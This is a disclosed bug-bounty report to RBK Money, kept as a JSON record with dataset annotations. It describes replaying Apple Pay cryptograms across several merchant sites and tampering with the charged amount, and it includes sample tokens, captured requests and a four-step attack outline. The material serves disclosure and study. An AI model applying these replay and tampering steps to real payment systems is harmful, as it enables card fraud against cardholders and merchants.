{
    "reported_to": "RBKmoney",
    "reported_by": "timyun ",
    "title": "Apple Pay cryptogram replay and amount tampering",
    "content": "\nDuring Apple Pay in-app or on-site payments the device generates a payment cryptogram, which contains a transaction ID, encrypted payment data, etc.\nThis is an example of the cryptogram which the phone passes to the internet acquiring service on api.transferwise.com:\nCode 451 Bytes\n1\"token\": {\n2\t\t\t\t\"paymentData\": {\n3\t\t\t\t\t\"version\": \"EC_v1\",\n4\t\t\t\t\t\"data\": \"tJ*\",\n5\t\t\t\t\t\"signature\": \"MIAGC*\",\n6\t\t\t\t\t\"header\": {\n7\t\t\t\t\t\t\"ephemeralPublicKey\": \"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEPU54D0AnTNCE/rA/99aMiu10cCzW9mnA1xqhaV+pUY3cQ9oYHrtO6uXf24VrDxAwMgNeJOduroEtgAt7IAMrPA==\",\n8\t\t\t\t\t\t\"publicKeyHash\": \"iGhC/O768cuRV11jvaEac1ytv9zCtsFfK6yxDzcEorI=\",\n9\t\t\t\t\t\t\"transactionId\": \"fe573e4aaebd7b76e80032c0708624a108622d7f3d31389101a6ba059653a4f4\"\n10\t\t\t\t\t}\n11\t\t\t\t}\nData field contains encrypted onlinePaymentCryptogram which represents \"Online payment cryptogram, as defined by 3-D Secure.\"\nApple also requires to \"Inspect the CMS signing time of the signature, as defined by section 11.3 of RFC 5652. If the time signature and the transaction time differ by more than a few minutes, it's possible that the token is a replay attack.\"\nThis is all described in:\nhttps://developer.apple.com/library/archive/documentation/PassKit/Reference/PaymentTokenJSON/PaymentTokenJSON.html\nThe attack is possible due to the lack of checks during Apple Pay payments. The same cryptogram was used a few time within 24h, on the different stores (https://rbk.mn/D35rOlnep3f and https://fondchizhova.ru/node/729)\nCode 875 Bytes\n1\"token\": {\n2\t\t\t\t\"paymentData\": {\n3\t\t\t\t\t\"version\": \"EC_v1\",\n4\t\t\t\t\t\"data\": \"hVr4d5Zjm5ot07QGEdKDsCW+olmb3szPC3xS4Gcjr1ulQzvefzElQYjvezCkBIvFtBFUQeOxtIy3ZQVf69nb0uJNLanZ9AFBfzN8xxy23QeCuFQWh0SkgUjc9/Lw1IRtGYrUJx2WeX+YtXP+/yzK8g0RDr1pvwHRKWOay64W+4DbemsWC8ShYk7mdfzge9urSwHeJfXK/y5hLdNvJkJfQvPu0cxkASZhVeSvz0/7ngKtnCP9DCIsIGhof+Nc30fCb4nA1asHelWOgXNKngeUYJi2gWX3bo8WcYf+65cWFjrWMro4bRzHh2VbRQpoULRjlqInPMel3ZhI3bhOVE4dVlbyLSsJYQcKwDLBSXybCsD591WAhaHdf9Wpxmb/rYSC6O55SqaBgT13MoH3xFH1O6ZRFzVjE8+2YVzZhsV9eyr/\",\n5\t\t\t\t\t\"signature\": \"MIAGC\",\n6\t\t\t\t\t\"header\": {\n7\t\t\t\t\t\t\"ephemeralPublicKey\": \"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEmLnyjZMabQOikn7jEKkc92SVvMNW2xJOZLyMVXUNs52so+U0LIZ7xRjYSq6eWwpcqvdR0wJSg22gB+gjfkhUhw==\",\n8\t\t\t\t\t\t\"publicKeyHash\": \"iGhC/O768cuRV11jvaEac1ytv9zCtsFfK6yxDzcEorI=\",\n9\t\t\t\t\t\t\"transactionId\": \"f376400ae00b9201fa45096ad1a80f048295d41f5c4c2f5c7e06fe88141f3543\"\n10\t\t\t\t\t}\n11\t\t\t\t}\ncryptogram was used to create 2 tokens for payments on 2\ndifferent sites:\ndate: Thu, 01 Oct 2020 10:30:34 GMT\nCode 854 Bytes\n1{\"clientInfo\":{\"fingerprint\":\"a7e21773614841122f9f3203e8ea8432\",\"ip\":\"92.40.171.45\"},\"paymentSession\":\"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40NSJ9LCJwYXltZW50U2Vzc2lvbiI6IjdZYTRsdkZEYTE5emlldXh0bGFXWEEifQ\",\"paymentToolDetails\":{\"cardNumberMask\":\"*3064\",\"detailsType\":\"PaymentToolDetailsBankCard\",\"last4\":\"3064\",\"paymentSystem\":\"visa\",\"tokenProvider\":\"applepay\"},\"paymentToolToken\":\"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..dxiUkBowKsMkyz3N71ECxA.5XActkAUb0MH-46pEb139iNHtKyx21OherM2vENcB7vFhL-BbwKLqelsvZ-b_7ydEwXeaYy3ZeN2ScHZ8k5pZffDwUS_QZ75_zOx2nKvaK54eBdkHwNtbqh5MvTIQJaUcgaff5ppc_HWLYSUQNywmeW0wsj5DDg5tnSVucPPR6uvycohIC9IgkdgglxgH9jhNvtsLasVfHcCruD9WgAlA7k4kFm4D5Vx3EsppzKY_UpvrZ--4zFGp9-dTxhbqT4N.3YFEzU4hG-3XLosxrJ7tag\"}\nand\ndate: Thu, 01 Oct 2020 10:31:51 GMT\nCode 854 Bytes\n1{\"clientInfo\":{\"fingerprint\":\"a7e21773614841122f9f3203e8ea8432\",\"ip\":\"92.40.171.40\"},\"paymentSession\":\"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40MCJ9LCJwYXltZW50U2Vzc2lvbiI6IjdRZ1NPMm14TzU1QkxRR3k0VTFtZ3AifQ\",\"paymentToolDetails\":{\"cardNumberMask\":\"*3064\",\"detailsType\":\"PaymentToolDetailsBankCard\",\"last4\":\"3064\",\"paymentSystem\":\"visa\",\"tokenProvider\":\"applepay\"},\"paymentToolToken\":\"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..GUWDdl9N61xwMHavh1Ug3Q.3NnV7rSCeJ_XMRHje5bYbUEFbMZe3vUCueZa1dqL8WV1zJdJ1w2512MzvhwXEPNJbI5g0zsIt-YGD9TFeKO6ISqm0QZK1Gh41LahS-FItceLu7ZS-cpeGOrzYHeWjXo5gKLpuiMdefMz9xTp8HymGz8S_gQX8rsXevVJPYZPVNU7se536e-vTvePAdVR43lKWda2F_3GMwwZRI3YyhylkBo_Ff5fC9o0yuYYJZbbPD2H4c3kkw47bfh4xAeHZ3hx.OkcqSZfsg9npMMJvI-jo1g\"}\nand\ndate: Thu, 01 Oct 2020 10:33:31 GMT\nCode 881 Bytes\n1{\"clientInfo\":{\"fingerprint\":\"a7e21773614841122f9f3203e8ea8432\",\"ip\":\"92.40.171.40\"},\"paymentSession\":\"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40MCJ9LCJwYXltZW50U2Vzc2lvbiI6IjRjdzF5Vm1GRjdjd1hOUmluV3F2ODEifQ\",\"paymentToolDetails\":{\"cardNumberMask\":\"************3064\",\"detailsType\":\"PaymentToolDetailsBankCard\",\"last4\":\"3064\",\"paymentSystem\":\"visa\",\"tokenProvider\":\"applepay\"},\"paymentToolToken\":\"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..jOVdbK-IGoMcZzTzo5FPnw.MgVNAkhBHHreNKKw7aaP19_pwDDaFvuYkAEZhiHdFzbTsDFbikNCnPoDeR2PRndAgBSKPYPC-JrUYzEj3jBjHu9_XbRhOL0wunTzXpCFWaoyWX9U4QkWyTAM-g6CIQU4eTzpLu7SJAAUU1KnUYyXOK6LMApxq3FN_s3T_5jnejBwWh2IHHPgiaUxMA7SCjb4XHV5RI3CBqXow6AHeEP4kvRjWFGv8nqrL3oWPkpBWUcOA_Ihe-P1AgZ82kUrUP66.w4cX0ohp96B776qws1yHAQ\"}                \nRBK Money also doesn't check what price has been shown on the Apple Pay payment sheet and has been signed by the customer, but only the price that is sent on the https://api.rbk.money/v2/processing/invoice-templates/[id]/invoices\nrequest. So stolen cryptograms can be used for much larger/arbitrary payments.\nCode 922 Bytes\n1{\n2\t\"clientInfo\": {\n3\t\t\"fingerprint\": \"a7e21773614841122f9f3203e8ea8432\",\n4\t\t\"ip\": \"92.237.66.14\"\n5\t},\n6\t\"paymentSession\": \"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjIzNy42Ni4xNCJ9LCJwYXltZW50U2Vzc2lvbiI6IjVSN2lKbkkxalAyc1g1eEhRdlBkQ20ifQ\",\n7\t\"paymentToolDetails\": {\n8\t\t\"cardNumberMask\": \"************8631\",\n9\t\t\"detailsType\": \"PaymentToolDetailsBankCard\",\n10\t\t\"last4\": \"8631\",\n11\t\t\"paymentSystem\": \"mastercard\",\n12\t\t\"tokenProvider\": \"applepay\"\n13\t},\n14\t\"paymentToolToken\": \"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..j1q3rFfHWzFtxDNzU1fBBA.6cszZeR2iDsUwz2--hBiR0Z_pK2gsOjd4dmTjssTkZZa6Lzz3gcjyFeSmzYsQgd2mqfAjvP4r_1gNsK1FQC4tAaGeAixJiLnWqjeY1-F_0wac5kyvWB70Q9ofjWvoo9no3Bwe21Utc42ByO9NJRHDk4H58AvfRbRZAA-z76zsFTyTK-eWQl06A3LR8gJIfgRWSBlRFye72UsKH7v2oLQNKSds9UamD_1tze0UN0srh2mGTA7m5raCUUnxL947W-Rhd7TOw.dzobn5l6XWSQX77A9WPiiw\"\n15}\nHas shown a 100,00 transaction, however it was used to sign a 110,00 payment.\nTo implement this attack, hackers can follow the e-skimming attacks similar to Magecart. After infecting user device (Macbook) or rbk.money resources, even the card is fully virtual and data is encrypted, it still can be used multiple times for committing fraud.\nNotice: the original research was presented in 2017 https://www.blackhat.com/docs/us-17/thursday/us-17-Yunusov-The-Future-Of-Applepwn-How-To-Save-Your-Money.pdf since that this attack is not possible with MC cards due to the fact that MC has necessary controls within their network to decline replay attacks. So this attack is possible only with Visa cards.\nImpact\nStolen Apple Pay cryptogram can be used many times in the future for making fraudulent payments for any RBK Money merchant.\n\n",
    "severity": [
        7.3,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Cryptographic Issues - Generic"
    ],
    "screenshots": {},
    "disclosed_date": 1615420560,
    "report_url": "https://hackerone.com/reports/996540",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Intercept an Apple Pay cryptogram during a transaction."
        ],
        [
            2,
            "Reuse the same cryptogram for multiple transactions on different merchant sites within a short timeframe (e.g., 24 hours)."
        ],
        [
            3,
            "Tamper with the payment amount during the transaction submission to the payment processor (e.g., RBK Money)."
        ],
        [
            4,
            "Observe that the payment is processed successfully despite the cryptogram replay and amount tampering."
        ]
    ],
    "vuln_description": "The vulnerability allows attackers to reuse Apple Pay cryptograms (payment tokens) across multiple transactions and tamper with payment amounts due to insufficient validation by the payment processor. This enables fraudulent payments without the cardholder's consent.",
    "reason": "The attack involves understanding the structure of Apple Pay cryptograms, intercepting them, and exploiting the lack of replay protection and amount validation by the payment processor. It requires knowledge of payment processing flows and the ability to manipulate transaction data.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}